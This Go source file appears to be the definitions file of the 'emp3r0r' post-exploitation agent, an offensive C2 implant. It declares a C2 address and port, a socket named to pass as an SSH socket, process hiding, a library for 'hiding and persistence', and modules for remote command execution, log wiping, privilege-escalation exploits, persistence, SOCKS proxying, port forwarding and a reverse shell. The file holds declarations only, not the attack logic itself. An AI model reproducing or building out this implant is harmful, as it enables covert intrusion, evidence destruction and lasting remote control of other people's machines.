package agent

import (
	"context"
	"net/http"
	"os"
	"strconv"

	"github.com/posener/h2conn"
	"github.com/txthinking/socks5"
)

var (
	// AgentRoot root directory of emp3r0r
	AgentRoot, _ = os.Getwd()

	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
	Transport = "HTTP2"

	// UtilsPath binary path of utilities
	UtilsPath = AgentRoot + "/..."

	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
	Libemp3r0rFile = UtilsPath + "/libemp3r0r.so"

	// HTTPClient handles agent's http communication
	HTTPClient *http.Client

	// H2Json the connection to CC, for JSON message-based communication
	H2Json *h2conn.Conn

	// ProxyServer Socks5 proxy listening on port 10800
	ProxyServer *socks5.Server

	// CCAddress how our agent finds its CC
	CCAddress = "https://[cc_ipaddr]"

	// HIDE_PIDS all the processes from emp3r0r
	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
)

const (
	// PIDFile stores agent PID
	PIDFile = "/tmp/e.lock"

	// SocketName name of our unix socket
	SocketName = "/tmp/ssh-s6Y4tDtahIuL"

	// CCPort port of c2
	CCPort = "8000"

	// CCIndicator check this before trying connection
	CCIndicator = "[cc_indicator]"

	// Tag uuid of this agent
	Tag = "[agent_uuid]"

	// OpSep separator of CC payload
	OpSep = "cb433bd1-354c-4802-a4fa-ece518f3ded1"

	// RShellBufSize buffer size of reverse shell stream
	RShellBufSize = 128

	// ProxyBufSize buffer size of port fwd
	ProxyBufSize = 1024
)

// Module names
const (
	ModCMD_EXEC    = "cmd_exec"
	ModCLEAN_LOG   = "clean_log"
	ModLPE_SUGGEST = "lpe_suggest"
	ModPERSISTENCE = "get_persistence"
	ModPROXY       = "run_proxy"
	ModPORT_FWD    = "port_fwd"
	ModSHELL       = "interactive_shell"
	ModVACCINE     = "vaccine"
	ModGET_ROOT    = "get_root"
)

// Module help info
var ModuleDocs = map[string]string{
	ModCMD_EXEC:    "Run a single command on a target",
	ModCLEAN_LOG:   "Delete lines containing keyword from *tmp logs",
	ModLPE_SUGGEST: "Run unix-priv-check and linux exploit suggester",
	ModPERSISTENCE: "Get persistence via built-in methods",
	ModPROXY:       "Start a socks proxy on target, and use it locally on C2 side",
	ModPORT_FWD:    "Port mapping",
	ModSHELL:       "Run custom bash on target, a perfect reverse shell",
	ModVACCINE:     "Vaccine helps you install additional tools on target system",
	ModGET_ROOT:    "Try some built-in LPE exploits",
}

// SystemInfo agent properties
type SystemInfo struct {
	Tag         string   // identifier of the agent
	Transport   string   // transport the agent uses (HTTP2 / CDN / TOR)
	Hostname    string   // Hostname and machine ID
	Hardware    string   // machine details and hypervisor
	Container   string   // container tech (if any)
	CPU         string   // CPU info
	Mem         string   // memory size
	OS          string   // OS name and version
	Kernel      string   // kernel release
	Arch        string   // kernel architecture
	IP          string   // public IP of the target
	IPs         []string // IPs that are found on target's NICs
	ARP         []string // ARP table
	User        string   // user account info
	HasRoot     bool     // is agent run as root?
	HasTor      bool     // is agent from Tor?
	HasInternet bool     // has internet access?
}

// MsgTunData data to send in the tunnel
type MsgTunData struct {
	Payload string `json:"payload"` // payload
	Tag     string `json:"tag"`     // tag of the agent
}

// H2Conn add context to h2conn.Conn
type H2Conn struct {
	Conn   *h2conn.Conn
	Ctx    context.Context
	Cancel context.CancelFunc
}
